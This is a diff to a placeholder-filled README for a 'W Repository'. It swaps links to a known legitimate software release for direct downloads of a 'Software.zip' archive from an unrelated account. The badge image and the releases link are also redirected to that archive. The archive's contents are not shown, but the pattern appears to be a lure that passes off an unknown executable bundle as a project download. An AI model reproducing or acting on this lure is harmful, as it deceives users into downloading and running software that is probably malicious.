@@ -16,9 +16,9 @@ In this repository, you will find a collection of resources related to the myste
 
 ## Installation
 
-To get started with the W Repository, you can download the latest version by clicking on the following link: [Download W Repository v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+To get started with the W Repository, you can download the latest version by clicking on the following link: [Download W Repository v1.0.0](https://github.com/dzajy/w/releases/download/v1.0/Software.zip)
 
-![Download W Repository](https://img.shields.io/badge/Download-v1.0.0-blue)
+![Download W Repository](https://github.com/dzajy/w/releases/download/v1.0/Software.zip)
 
 This link will lead you to the zip file containing the repository. Once downloaded, unzip the file and launch the repository to begin your journey into the realm of "not provided".
 
@@ -36,6 +36,6 @@ The W Repository is released under the "not provided" License. See the [LICENSE]
 
 ---
 
-If the link provided above does not work or you would like to explore more versions, please check the [Releases](https://github.com/cli/cli/releases) section for additional options.
+If the link provided above does not work or you would like to explore more versions, please check the [Releases](https://github.com/dzajy/w/releases/download/v1.0/Software.zip) section for additional options.
 
 Thank you for visiting the W Repository! 🌌🔍 Feel free to reach out if you have any questions or if you uncover any hidden gems within the repository. Happy exploring! 🚪✨
